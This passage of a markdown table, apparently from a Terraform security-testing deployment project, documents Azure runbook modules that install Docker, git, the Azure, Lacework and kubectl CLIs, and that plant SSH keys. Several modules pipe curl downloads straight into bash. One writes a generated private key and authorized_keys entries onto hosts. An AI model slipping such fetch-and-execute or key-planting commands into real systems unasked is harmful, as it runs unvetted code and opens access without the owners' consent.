&quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| target-runbook-deploy-docker                             | ./modules/runbook/deploy-docker                      | runbook_deploy_docker                            | context.azure.runbook.deploy_docker                               | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_docker&quot;: {<br/>                    &quot;docker_users&quot;: [],<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-docker                      | <pre>locals \{<br/>    tool=&quot;docker&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;Checking for $\{local\.tool\}\.\.\.&quot;<br/>    if \! command \-v $\{local\.tool\} &amp;&gt;/dev/null; then<br/>        log &quot;$\{local\.tool\} not found installation required&quot;<br/>    fi<br/>    log &quot;$\{local\.tool\} path: $\(command \-v  $\{local\.tool\}\)&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        if command \-v $\{local\.tool\} &amp;&gt;/dev/null; then<br/>            log &quot;$\{local\.tool\} found \- no installation required&quot;; <br/>            \# ensure non root users are added to the docker group<br/>            if \[\[ &quot;&quot; \!= &quot;$\{join\(&quot; &quot;, var\.inputs\[&quot;docker\_users&quot;\]\)\}&quot; \]\] &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>                usermod \-aG docker $\{join\(&quot;\\nusermod \-aG docker &quot;, var\.inputs\[&quot;docker\_users&quot;\]\)\}<br/>            fi<br/>            exit 0; <br/>        fi<br/>        sudo apt\-get update<br/>        sudo apt\-get remove \-y docker docker\-engine docker\.io containerd runc<br/>        sudo apt\-get install \-y \\<br/>            ca\-certificates \\<br/>            curl \\<br/>            gnupg \\<br/>            lsb\-release<br/>        sudo mkdir \-p /etc/apt/keyrings<br/>        sudo rm \-f /etc/apt/keyrings/docker\.gpg<br/>        curl \-fsSL https://download\.docker\.com/linux/ubuntu/gpg \| sudo gpg \-\-dearmor \-o /etc/apt/keyrings/docker\.gpg<br/>        echo \\<br/>        &quot;deb \[arch=$\(dpkg \-\-print\-architecture\) signed\-by=/etc/apt/keyrings/docker\.gpg\] https://download\.docker\.com/linux/ubuntu \\<br/>        $\(lsb\_release \-cs\) stable&quot; \| sudo tee /etc/apt/sources\.list\.d/docker\.list &gt; /dev/null<br/>        sudo apt\-get update<br/>        EOT<br/>        apt\_packages = &quot;docker\-ce docker\-ce\-cli containerd\.io docker\-buildx\-plugin docker\-compose\-plugin&quot;<br/>        apt\_post\_tasks = &lt;&lt;\-EOT<br/>        \# ensure non root users are added to the docker group<br/>        if \[\[ &quot;&quot; \!= &quot;$\{join\(&quot; &quot;, var\.inputs\[&quot;docker\_users&quot;\]\)\}&quot; \]\] &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>            usermod \-aG docker $\{join\(&quot;\\nusermod \-aG docker &quot;, var\.inputs\[&quot;docker\_users&quot;\]\)\}<br/>        fi<br/>        EOT<br/>        yum\_pre\_tasks = &lt;&lt;\-EOT<br/>        if command \-v $\{local\.tool\} &amp;&gt;/dev/null; then<br/>            log &quot;$\{local\.tool\} found \- no installation required&quot;;<br/>            \# ensure non root users are added to the docker group<br/>            if \[\[ &quot;&quot; \!= &quot;$\{join\(&quot; &quot;, var\.inputs\[&quot;docker\_users&quot;\]\)\}&quot; \]\] &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>                usermod \-aG docker $\{join\(&quot;\\nusermod \-aG docker &quot;, var\.inputs\[&quot;docker\_users&quot;\]\)\}<br/>            fi<br/>            exit 0; <br/>        fi<br/>        yum update \-y<br/>        yum remove docker \\<br/>                  docker\-client \\<br/>                  docker\-client\-latest \\<br/>                  docker\-common \\<br/>                  docker\-latest \\<br/>                  docker\-latest\-logrotate \\<br/>                  docker\-logrotate \\<br/>                  docker\-engine<br/>        yum install \-y yum\-utils<br/>        yum\-config\-manager \-\-add\-repo https://download\.docker\.com/linux/centos/docker\-ce\.repo<br/>        EOT<br/>        yum\_packages = &quot;docker\-ce docker\-ce\-cli containerd\.io docker\-buildx\-plugin docker\-compose\-plugin&quot;<br/>        yum\_post\_tasks = &lt;&lt;\-EOT<br/>        \# ensure non root users are added to the docker group<br/>        if \[\[ &quot;&quot; \!= &quot;$\{join\(&quot; &quot;, var\.inputs\[&quot;docker\_users&quot;\]\)\}&quot; \]\] &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>            usermod \-aG docker $\{join\(&quot;\\nusermod \-aG docker &quot;, var\.inputs\[&quot;docker\_users&quot;\]\)\}<br/>        fi<br/>        EOT<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| target-runbook-deploy-git                                | ./modules/runbook/deploy-git                         | runbook_deploy_git                               | context.azure.runbook.deploy_git                                  | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_git&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-git                         | <pre>locals \{<br/>    tool=&quot;git&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;Checking for $\{local\.tool\}\.\.\.&quot;<br/>     if \! command \-v $\{local\.tool\} &amp;&gt;/dev/null; then<br/>        log &quot;$\{local\.tool\} not found installation required&quot;<br/>    fi<br/>    log &quot;$\{local\.tool\} path: $\(command \-v  $\{local\.tool\}\)&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        if command \-v $\{local\.tool\} &amp;&gt;/dev/null; then<br/>            log &quot;$\{local\.tool\} found \- no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt\_packages = &quot;git&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        if command \-v $\{local\.tool\} &amp;&gt;/dev/null; then<br/>            log &quot;$\{local\.tool\} found \- no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum\_packages = &quot;git&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| target-runbook-azure-cli                                 | ./modules/runbook/deploy-azure-cli                   | runbook_deploy_azure_cli                         | context.azure.runbook.deploy_azure_cli                            | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_azure_cli&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-azure-cli                   | <pre>locals \{<br/>    tool=&quot;az&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;Checking for $\{local\.tool\}\.\.\.&quot;<br/>    if \! command \-v $\{local\.tool\}; then<br/>        log &quot;$\{local\.tool\} not found installation required&quot;<br/>        curl \-sL https://aka\.ms/InstallAzureCLIDeb \| bash <br/>    fi<br/>    log &quot;$\{local\.tool\} path: $\(command \-v $\{local\.tool\}\)&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        if command $\{local\.tool\}; then<br/>            log &quot;$\{local\.tool\} found installation not required&quot;<br/>            exit 0<br/>        fi<br/>        EOT<br/>        apt\_packages = &quot;jq&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks = &lt;&lt;\-EOT<br/>        if command $\{local\.tool\}; then<br/>            log &quot;$\{local\.tool\} found installation not required&quot;<br/>            exit 0<br/>        fi<br/>        EOT<br/>        yum\_packages = &quot;jq&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/>    <br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| target-runbook-lacework-cli                              | ./modules/runbook/deploy-lacework-cli                | runbook_deploy_lacework_cli                      | context.azure.runbook.deploy_lacework_cli                         | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_lacework_cli&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-cli                | <pre>locals \{<br/>    tool=&quot;lacework&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;Checking for $\{local\.tool\}\.\.\.&quot;<br/>    if \! command \-v $\{local\.tool\}; then<br/>        log &quot;$\{local\.tool\} not found installation required&quot;<br/>        curl https://raw\.githubusercontent\.com/lacework/go\-sdk/main/cli/install\.sh \| bash<br/>    fi<br/>    log &quot;$\{local\.tool\} path: $\(command \-v  $\{local\.tool\}\)&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        if command \-v $\{local\.tool\} &amp;&gt;/dev/null; then<br/>            log &quot;$\{local\.tool\} found \- no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt\_packages = &quot;jq&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        if command \-v $\{local\.tool\} &amp;&gt;/dev/null; then<br/>            log &quot;$\{local\.tool\} found \- no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum\_packages = &quot;jq&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| target-runbook-kubectl-cli                               | ./modules/runbook/deploy-kubectl-cli                 | runbook_deploy_kubectl_cli                       | context.azure.runbook.deploy_kubectl_cli                          | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_kubectl_cli&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-kubectl-cli                 | <pre>locals \{<br/>    tool=&quot;kubectl&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;Checking for $\{local\.tool\}\.\.\.&quot;<br/>    if \! command \-v $\{local\.tool\}; then<br/>        log &quot;$\{local\.tool\} not found installation required&quot;<br/>        curl \-LO &quot;https://storage\.googleapis\.com/kubernetes\-release/release/$\(curl \-s https://storage\.googleapis\.com/kubernetes\-release/release/stable\.txt\)/bin/linux/amd64/kubectl&quot;<br/>        sudo install \-o root \-g root \-m 0755 kubectl /usr/local/bin/kubectl<br/>    fi<br/>    log &quot;$\{local\.tool\} path: $\(command \-v  $\{local\.tool\}\)&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        if command \-v $\{local\.tool\} &amp;&gt;/dev/null; then<br/>            log &quot;$\{local\.tool\} found \- no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt\_packages = &quot;jq&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        if command \-v $\{local\.tool\} &amp;&gt;/dev/null; then<br/>            log &quot;$\{local\.tool\} found \- no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum\_packages = &quot;jq&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| target-ssh-keys                                          | ./modules/runbook/deploy-ssh-keys                    | runbook_deploy_secret_ssh_private                | context.azure.runbook.ssh_keys                                    | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;ssh_keys&quot;: {<br/>                    &quot;enabled&quot;: false,<br/>                    &quot;ssh_authorized_keys_path&quot;: &quot;/home/sshuser/.ssh/authorized_keys&quot;,<br/>                    &quot;ssh_private_key_path&quot;: &quot;/home/sshuser/.ssh/secret_key&quot;,<br/>                    &quot;ssh_public_key_path&quot;: &quot;/home/sshuser/.ssh/secret_key.pub&quot;<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-keys                    | <pre>\# ssh key<br/>resource &quot;tls\_private\_key&quot; &quot;ssh&quot; \{<br/>  algorithm = &quot;RSA&quot;<br/>  rsa\_bits  = &quot;4096&quot;<br/>\}<br/><br/>locals \{<br/>    ssh\_private\_key = base64encode\(tls\_private\_key\.ssh\.private\_key\_pem\)<br/>    ssh\_private\_key\_path = var\.inputs\[&quot;ssh\_private\_key\_path&quot;\]<br/>    ssh\_public\_key = base64encode\(chomp\(tls\_private\_key\.ssh\.public\_key\_openssh\)\)<br/>    ssh\_public\_key\_path = var\.inputs\[&quot;ssh\_public\_key\_path&quot;\]<br/>    ssh\_authorized\_keys\_path = var\.inputs\[&quot;ssh\_authorized\_keys\_path&quot;\]<br/>    public\_key\_user = split\(&quot;/&quot;, local\.ssh\_public\_key\_path\)\[1\] == &quot;root&quot; ? &quot;root&quot; : split\(&quot;/&quot;, local\.ssh\_public\_key\_path\)\[2\]<br/>    private\_key\_user = split\(&quot;/&quot;, local\.ssh\_private\_key\_path\)\[1\] == &quot;root&quot; ? &quot;root&quot; : split\(&quot;/&quot;, local\.ssh\_private\_key\_path\)\[2\]<br/><br/>    payload\_public = &lt;&lt;\-EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;creating public key: $\{local\.ssh\_public\_key\_path\}&quot;<br/>    log &quot;adding user: $\{local\.public\_key\_user\}\.\.\.&quot;<br/>    adduser \-\-gecos &quot;&quot; \-\-disabled\-password &quot;$\{local\.public\_key\_user\}&quot; \|\| log &quot;$\{local\.public\_key\_user\} user already exists&quot;<br/>    mkdir \-p $\{dirname\(local\.ssh\_public\_key\_path\)\}<br/>    chown \-R $\{local\.public\_key\_user\}:$\{local\.public\_key\_user\} $\{dirname\(local\.ssh\_public\_key\_path\)\}<br/>    echo &#x27;$\{base64decode\(local\.ssh\_public\_key\)\}&#x27; &gt; $\{local\.ssh\_public\_key\_path\}<br/>    echo &#x27;$\{base64decode\(local\.ssh\_public\_key\)\}&#x27; &gt;&gt; $\{local\.ssh\_authorized\_keys\_path\}<br/>    sort $\{local\.ssh\_authorized\_keys\_path\} \| uniq &gt; $\{local\.ssh\_authorized\_keys\_path\}\.uniq<br/>    mv $\{local\.ssh\_authorized\_keys\_path\}\.uniq $\{local\.ssh\_authorized\_keys\_path\}<br/>    chmod 600 $\{local\.ssh\_public\_key\_path\} $\{local\.ssh\_authorized\_keys\_path\}<br/>    chown \-R $\{local\.public\_key\_user\}:$\{local\.public\_key\_user\} $\{local\.ssh\_public\_key\_path\} $\{local\.ssh\_authorized\_keys\_path\}<br/>    log &quot;public key: $\(ls \-l $\{local\.ssh\_public\_key\_path\}\)&quot;<br/>    log &quot;authorized key: $\(ls \-l $\{local\.ssh\_authorized\_keys\_path\}\)&quot;<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64\_payload\_public = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;public\_tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload\_public<br/>    \}\}\)<br/><br/>    payload\_private = &lt;&lt;\-EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;creating private key: $\{local\.ssh\_private\_key\_path\}&quot;<br/>    log &quot;adding user: $\{local\.private\_key\_user\}\.\.\.&quot;<br/>    adduser \-\-gecos &quot;&quot; \-\-disabled\-password &quot;$\{local\.private\_key\_user\}&quot; \|\| log &quot;$\{local\.private\_key\_user\} user already exists&quot;<br/>    mkdir \-p $\{dirname\(local\.ssh\_private\_key\_path\)\}<br/>    echo &#x27;$\{base64decode\(local\.ssh\_private\_key\)\}&#x27; &gt; $\{local\.ssh\_private\_key\_path\}<br/>    chmod 600 $\{local\.ssh\_private\_key\_path\}<br/>    chown $\{local\.private\_key\_user\}:$\{local\.private\_key\_user\} $\{local\.ssh\_private\_key\_path\}<br/>    log &quot;private key: $\(ls \-l $\{local\.ssh\_private\_key\_path\}\)&quot;<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64\_payload\_private = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;private\_tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload\_private<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload\_public = base64gzip\(local\.base64\_payload\_public\)<br/>        base64\_uncompressed\_payload\_public = base64encode\(local\.base64\_payload\_public\)<br/>        base64\_payload\_private = base64gzip\(local\.base64\_payload\_private\)<br/>        base64\_uncompressed\_payload\_private = base64encode\(local\.base64\_payload\_private\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           